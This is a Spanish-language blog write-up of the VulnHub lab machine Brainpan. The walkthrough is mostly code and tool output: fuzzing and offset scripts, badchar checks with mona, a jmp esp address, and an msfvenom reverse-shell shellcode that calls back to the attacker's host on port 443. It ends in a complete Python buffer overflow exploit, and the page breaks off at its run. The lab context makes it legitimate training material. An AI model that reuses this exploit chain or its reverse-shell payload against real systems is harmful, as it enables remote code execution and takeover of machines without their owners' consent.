<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Writeup Brainpan VulnHub</title>
<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/brainpan.png">
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Writeup Brainpan VulnHub" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Resolución de la máquina Brainpan de la plataforma de VulnHub" />
<meta property="og:description" content="Resolución de la máquina Brainpan de la plataforma de VulnHub" />
<link rel="canonical" href="http://localhost:4000/another-page.html" />
<meta property="og:url" content="http://localhost:4000/another-page.html" />
<meta property="og:site_name" content="Writeup Brainpan VulnHub" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Writeup Brainpan VulnHub" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Brainpan de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>

    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
    <script src="/assets/js/respond.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

<meta name="theme-color" content="#353535">
<meta name="msapplication-navbutton-color" content="#353535">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

  </head>
  <body>

    <div class="wrapper">

      <section>
        <div id="title">
          <h1>Writeup Brainpan VulnHub</h1>
          <p>Resolución de la máquina Brainpan de la plataforma de VulnHub</p>
        </div>

<div><p>Iniciamos escaneando los puertos de la máquina con nmap, solo el 9999 y el 10000</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.62
Nmap scan report for 192.168.100.62
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt</span>
</code></pre></div></div>

<div><p>En el puerto 9999 nos encontramos un servicio personalizado que nos pide una contraseña</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ netcat</span><span class="p"> 192.168.100.62 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> test
                          ACCESS DENIED</span>
</code></pre></div></div>

<div><p>En el puerto 10000 encontramos una plantilla que habla de vulns pero no nos dice nada</p></div>
<div><p><img src="./1.png"><p></div>

<div><p>Pensando que nos pueden compartir algo buscaremos posibles directorios con ayuda de gobuster</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gobuster</span><span class="p"> dir -u http://192.168.100.62:10000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
===============================================================
[+] Url:                     http://192.168.100.62:10000/
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
</span><span class="kd">/bin</span><span class="p">                  (Status: 301) [Size: 0] [--> /bin/]</span>
</code></pre></div></div>

<div><p>Al verlo desde el navegador encontramos que nos comparten un archivo con extensión .exe</p></div>
<div><p><img src="./2.png"><p></div>

<div><p>Lo descargamos y al ejecutarlo en un windows vemos que se queda en espera de conexiones</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="no">.\brainpan.exe</span><span class="p">
[+] initializing winsock...done.
[+] server socket created.
[+] bind done on port 9999
[+] waiting for connections.</span>
</code></pre></div></div>

<div><p>Podemos pensas que tiene una vulnerabilidad de buffer overflow en el campo de la contraseña<div><p>

<div><p>Para explotarlo, lo primero que necesitamos es fuzzear la cantidad de bytes para que se corrompa el binario, esto para tener una idea del offset</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="kd">from</span><span class="p"> pwn</span><span class="kd"> import</span><span class="p"> log, socket, time

buffer </span><span class="kd">=</span><span class="p"> [</span><span class="k">b</span><span class="s2">"A"</span><span class="p">]
counter </span><span class="kd">=</span><span class="na"> 100</span><span class="p">

bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">""</span><span class="p">)

</span><span class="kd">while</span><span class="k"> len</span><span class="p">(buffer)</span><span class="kd"> <</span><span class="na"> 32</span><span class="p">:
    buffer</span><span class="p">.append(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> counter)
    counter </span><span class="kd">=</span><span class="p"> counter </span><span class="kd">+</span><span class="na"> 100</span><span class="p">

</span><span class="kd">for</span><span class="p"> strings </span><span class="kd">in</span><span class="p"> buffer:
    </span><span class="kd">try</span><span class="p">:
        time.sleep(</span><span class="na">1</span><span class="p">)
        bar.status(</span><span class="k">f</span><span class="s2">"Enviando: {len(strings)} bytes"</span><span class="p">)

        shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect </span><span class="kd">=</span><span class="p"> shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">,</span><span class="na"> 9999</span><span class="p">))

        shell.send(strings </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\r\n"</span><span class="p">)

        data </span><span class="kd">=</span><span class="p"> shell.recv(</span><span class="na">1024</span><span class="p">)
        shell.close()

    </span><span class="kd">except</span><span class="p">:
        bar.success(</span><span class="k">f</span><span class="s2">"El programa se detuvo al enviar: {len(strings)} bytes"</span><span class="p">)
        exit()</span>
</code></pre></div></div>

<div><p>Al ejecutar el script corriendo el .exe podemos ver que se detiene al enviar 600 bytes</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ python3 </span><span class="p">fuzzer.py
[</span><span class="s2">+</span><span class="p">] El programa se detuvo al enviar: 600 bytes</span>
</code></pre></div></div>

<div><p>Ahora con ayuda de la herramienta pattern_create de metasploit creamos uno de 600 bytes</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ pattern_create</span><span class="p"> -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9</span>
</code></pre></div></div>

<div><p>Creamos un nuevo exploit que en este caso solo enviara todo el pattern_creado</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="kd">
from </span><span class="p">pwn</span><span class="kd"> import </span><span class="p">log, socket

pattern </span><span class="kd">= </span><span class="k">b</span><span class="s2">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span><span class="p">

log.info(</span><span class="s2">"Enviando pattern"</span><span class="p">)

shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect </span><span class="kd">=</span><span class="p"> shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">9999</span><span class="p">))

shell.send(pattern)

data </span><span class="kd">=</span><span class="p"> shell.recv(</span><span class="na">1024</span><span class="p">)
shell.close()</span>
</code></pre></div></div>

<div><p>Ahora lo que necesitamos es controlar el EIP, para esto usaremos <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a>, asi que abrimos el exe y lo corremos</p></div>
<div><p><img src="./3.png"><p></div>

<div><p>Al ejecutar el exploit se enviara todo nuestro pattern</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ python3</span><span class="p"> offset.py
[</span><span class="na">*</span><span class="p">] Enviando pattern</span>
</code></pre></div></div>

<div><p>En Immunity Debugger podemos ver que el EIP vale 35724134</p></div>
<div><p><img src="./4.png"><p></div>

<div><p>Ayudandonos de pattern_offset también de metasploit podemos ver que se necesita una cantidad total de 524 bytes antes de sobreescribir el registro EIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ pattern_offset </span><span class="p">-q 35724134
[*] Exact match at offset 524</span>
</code></pre></div></div>

<div><p>Podemos comprobarlo creando un script que envie un total de 524 veces A y 4 veces B, si estamos en lo correcto EIP deberia valer 42424242 que son las 4 B</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="kd">from </span><span class="p">pwn</span><span class="kd"> import </span><span class="p">log, socket

offset </span><span class="kd">=</span><span class="na"> 524</span><span class="p">
junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> offset

log.info(</span><span class="s2">"Enviando data"</span><span class="p">)

shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect </span><span class="kd">=</span><span class="p"> shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">,</span><span class="na"> 9999</span><span class="p">))

shell.send(junk</span><span class="kd"> + </span><span class="k">b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 4</span><span class="p">)

data </span><span class="kd">=</span><span class="p"> shell.recv(</span><span class="na">1024</span><span class="p">)
shell.close()</span>
</code></pre></div></div>

<div><p>Corremos el script y podemos ver que ek EIP vale 42424242, tenemos el control, del EIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ python3 </span><span class="p">eip.py
[</span><span class="na">*</span><span class="p">] Enviando data</span>
</code></pre></div></div>
<div><p><img src="./5.png"><p></div>

<div><p>Lo que ahora necesitamos es detectar badchars que puedan darnos problemas asi que con ayuda de <a href="https://github.com/corelan/mona">mona</a> crearemos un bytearray quitando de primeras el \x00 ya que siempre da problemas</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona bytearray -cpb "\x00"</span>
</code></pre></div></div>

<div><p><img src="./6.png"><p></div>

<div><p>Al script anterior simplemente le agregaremos los badchars para enviarlos despues del EIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket

offset </span><span class="kd">=</span><span class="na"> 524</span><span class="p">
junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> offset

badchars </span><span class="kd">=</span><span class="k"> b</span><span class="s2">""</span><span class="p">
badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span><span class="p">
badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span><span class="p">
badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span><span class="p">
badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span><span class="p">
badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span><span class="p">
badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span><span class="p">
badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span><span class="p">
badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span><span class="p">

log.info(</span><span class="s2">"Enviando badchars"</span><span class="p">)

shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect </span><span class="kd">=</span><span class="p"> shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">9999</span><span class="p">))

shell.send(junk </span><span class="kd">+ </span><span class="k">b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 4</span><span class="kd"> +</span><span class="p"> badchars)

data </span><span class="kd">=</span><span class="p"> shell.recv(</span><span class="na">1024</span><span class="p">)
shell.close()</span>
</code></pre></div></div>

<div><p>Ejecutamos el script para enviar los badchars</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ python3 </span><span class="p">badchars.py
[</span><span class="na">*</span><span class="p">] Enviando badchars</span>
</code></pre></div></div>

<div><p>Ahora nos centraremos en la dirección del ESP que es la que usaremos como argumento para con mona compare compararlo con el archivo bytearray.bin y detectar posibles badchars</p></div>
<div><p><img src="./7.png"><p></div>

<div><p>Al ejecutar mona compare nos muestra solo \x00 asi que probablemente solo hay un badchar</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona compare -f bytearray.bin -a 005FF910</span>
</code></pre></div></div>
<div><p><img src="./8.png"><p></div>
<div><p><img src="./9.png"><p></div>

<div><p>Usamos mona para listar los modulos y vemos que el mismo brainpan.exe no tiene protecciones</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona modules</span>
</code></pre></div></div>
<div><p><img src="./10.png"><p></div>
<div><p><img src="./11.png"><p></div>

<div><p>Ahora lo que queremos buscar en ese modulo es una dirección que aplique un jmp ESP, para esto podemos usar nasm_shell de metasploit para ver su valor que es FFE4</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ nasm_shell
</span><span class="kd">nasm ></span><span class="p"> jmp ESP
00000000  </span><span class="na">FFE4</span><span class="p">                jmp esp</span>
</code></pre></div></div>

<div><p>Entonces con mona buscaremos \xff\xe4 usando el login_support.dll como modulo</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona find -s "\xff\xe4" -m brainpan.exe</span>
</code></pre></div></div>
<div><p><img src="./12.png"><p></div>

<div><p>Como resultado conseguimos 1 dirección, pero como estamos en little endian hay que darle la vuelta</p></div>
<div><p><img src="./13.png"><p></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">\x31\x17\x12\xf3    -->    \xf3\x12\x17\x31</span>
</code></pre></div></div>

<div><p>Ahora tenemos que crear un shellcode con msfvenom que se encargue de crearnos una reverse shell, pasandole los badchars para evitar que los introduzca en el shellcode y de conflictos</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=192.168.100.41 LPORT=443 EXITFUNC=thread -a x86 -b "\x00" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xda\xd3\xba\x0d\xc5\xfc\x6d\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x52\x31\x56\x17\x83\xc6\x04"
shellcode += b"\x03\x5b\xd6\x1e\x98\x9f\x30\x5c\x63\x5f\xc1"
shellcode += b"\x01\xed\xba\xf0\x01\x89\xcf\xa3\xb1\xd9\x9d"
shellcode += b"\x4f\x39\x8f\x35\xdb\x4f\x18\x3a\x6c\xe5\x7e"
shellcode += b"\x75\x6d\x56\x42\x14\xed\xa5\x97\xf6\xcc\x65"
shellcode += b"\xea\xf7\x09\x9b\x07\xa5\xc2\xd7\xba\x59\x66"
shellcode += b"\xad\x06\xd2\x34\x23\x0f\x07\x8c\x42\x3e\x96"
shellcode += b"\x86\x1c\xe0\x19\x4a\x15\xa9\x01\x8f\x10\x63"
shellcode += b"\xba\x7b\xee\x72\x6a\xb2\x0f\xd8\x53\x7a\xe2"
shellcode += b"\x20\x94\xbd\x1d\x57\xec\xbd\xa0\x60\x2b\xbf"
shellcode += b"\x7e\xe4\xaf\x67\xf4\x5e\x0b\x99\xd9\x39\xd8"
shellcode += b"\x95\x96\x4e\x86\xb9\x29\x82\xbd\xc6\xa2\x25"
shellcode += b"\x11\x4f\xf0\x01\xb5\x0b\xa2\x28\xec\xf1\x05"
shellcode += b"\x54\xee\x59\xf9\xf0\x65\x77\xee\x88\x24\x10"
shellcode += b"\xc3\xa0\xd6\xe0\x4b\xb2\xa5\xd2\xd4\x68\x21"
shellcode += b"\x5f\x9c\xb6\xb6\xa0\xb7\x0f\x28\x5f\x38\x70"
shellcode += b"\x61\xa4\x6c\x20\x19\x0d\x0d\xab\xd9\xb2\xd8"
shellcode += b"\x7c\x89\x1c\xb3\x3c\x79\xdd\x63\xd5\x93\xd2"
shellcode += b"\x5c\xc5\x9c\x38\xf5\x6c\x67\xab\x3a\xd8\xa6"
shellcode += b"\xab\xd3\x1b\x28\xad\x98\x95\xce\xc7\xce\xf3"
shellcode += b"\x59\x70\x76\x5e\x11\xe1\x77\x74\x5c\x21\xf3"
shellcode += b"\x7b\xa1\xec\xf4\xf6\xb1\x99\xf4\x4c\xeb\x0c"
shellcode += b"\x0a\x7b\x83\xd3\x99\xe0\x53\x9d\x81\xbe\x04"
shellcode += b"\xca\x74\xb7\xc0\xe6\x2f\x61\xf6\xfa\xb6\x4a"
shellcode += b"\xb2\x20\x0b\x54\x3b\xa4\x37\x72\x2b\x70\xb7"
shellcode += b"\x3e\x1f\x2c\xee\xe8\xc9\x8a\x58\x5b\xa3\x44"
shellcode += b"\x36\x35\x23\x10\x74\x86\x35\x1d\x51\x70\xd9"
shellcode += b"\xac\x0c\xc5\xe6\x01\xd9\xc1\x9f\x7f\x79\x2d"
shellcode += b"\x4a\xc4\x99\xcc\x5e\x31\x32\x49\x0b\xf8\x5f"
shellcode += b"\x6a\xe6\x3f\x66\xe9\x02\xc0\x9d\xf1\x67\xc5"
shellcode += b"\xda\xb5\x94\xb7\x73\x50\x9a\x64\x73\x71"</span>
</code></pre></div></div>

<div><p>Tenemos todo, nuestro exploit enviara un payload que son las A necesarias para llegar el EIP ahi le pasamos la dirección que hace el jmp al ESP, ademas le pasamos 16 nops para que tenga un poco de tiempo antes de interpretar el shellcode para que nos envie la shell</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket

offset </span><span class="kd">=</span><span class="na"> 524</span><span class="p">
junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> offset
jmpesp </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\xf3\x12\x17\x31"</span><span class="p">
nops </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="na"> 16</span><span class="p">

shellcode </span><span class="kd">=  </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xda\xd3\xba\x0d\xc5\xfc\x6d\xd9\x74\x24\xf4"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x5e\x29\xc9\xb1\x52\x31\x56\x17\x83\xc6\x04"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x03\x5b\xd6\x1e\x98\x9f\x30\x5c\x63\x5f\xc1"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x01\xed\xba\xf0\x01\x89\xcf\xa3\xb1\xd9\x9d"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x4f\x39\x8f\x35\xdb\x4f\x18\x3a\x6c\xe5\x7e"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x75\x6d\x56\x42\x14\xed\xa5\x97\xf6\xcc\x65"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xea\xf7\x09\x9b\x07\xa5\xc2\xd7\xba\x59\x66"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xad\x06\xd2\x34\x23\x0f\x07\x8c\x42\x3e\x96"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x86\x1c\xe0\x19\x4a\x15\xa9\x01\x8f\x10\x63"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xba\x7b\xee\x72\x6a\xb2\x0f\xd8\x53\x7a\xe2"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x20\x94\xbd\x1d\x57\xec\xbd\xa0\x60\x2b\xbf"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x7e\xe4\xaf\x67\xf4\x5e\x0b\x99\xd9\x39\xd8"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x95\x96\x4e\x86\xb9\x29\x82\xbd\xc6\xa2\x25"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x11\x4f\xf0\x01\xb5\x0b\xa2\x28\xec\xf1\x05"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x54\xee\x59\xf9\xf0\x65\x77\xee\x88\x24\x10"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xc3\xa0\xd6\xe0\x4b\xb2\xa5\xd2\xd4\x68\x21"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x5f\x9c\xb6\xb6\xa0\xb7\x0f\x28\x5f\x38\x70"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x61\xa4\x6c\x20\x19\x0d\x0d\xab\xd9\xb2\xd8"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x7c\x89\x1c\xb3\x3c\x79\xdd\x63\xd5\x93\xd2"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x5c\xc5\x9c\x38\xf5\x6c\x67\xab\x3a\xd8\xa6"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xab\xd3\x1b\x28\xad\x98\x95\xce\xc7\xce\xf3"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x59\x70\x76\x5e\x11\xe1\x77\x74\x5c\x21\xf3"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x7b\xa1\xec\xf4\xf6\xb1\x99\xf4\x4c\xeb\x0c"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x0a\x7b\x83\xd3\x99\xe0\x53\x9d\x81\xbe\x04"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xca\x74\xb7\xc0\xe6\x2f\x61\xf6\xfa\xb6\x4a"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xb2\x20\x0b\x54\x3b\xa4\x37\x72\x2b\x70\xb7"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x3e\x1f\x2c\xee\xe8\xc9\x8a\x58\x5b\xa3\x44"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x36\x35\x23\x10\x74\x86\x35\x1d\x51\x70\xd9"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xac\x0c\xc5\xe6\x01\xd9\xc1\x9f\x7f\x79\x2d"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x4a\xc4\x99\xcc\x5e\x31\x32\x49\x0b\xf8\x5f"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\xe6\x3f\x66\xe9\x02\xc0\x9d\xf1\x67\xc5"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xda\xb5\x94\xb7\x73\x50\x9a\x64\x73\x71"</span><span class="p">

log.info(</span><span class="s2">"Enviando shellcode"</span><span class="p">)

shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect </span><span class="kd">=</span><span class="p"> shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">,</span><span class="na"> 9999</span><span class="p">))

shell.send(junk </span><span class="kd">+</span><span class="p"> jmpesp </span><span class="kd">+</span><span class="p"> nops </span><span class="kd">+</span><span class="p"> shellcode </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\n\r"</span><span class="p">)

data </span><span class="kd">=</span><span class="p"> shell.recv(</span><span class="na">1024</span><span class="p">)
shell.close()

log.success(</span><span class="s2">"Revisa tu listener"</span><span class="p">)</span>
</code></pre></div></div>

<div><p>Finalmente solo ejecutamos el exploit y recibimos una shell en nuestro listener</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ python3 </span><span class="p">exploit.py
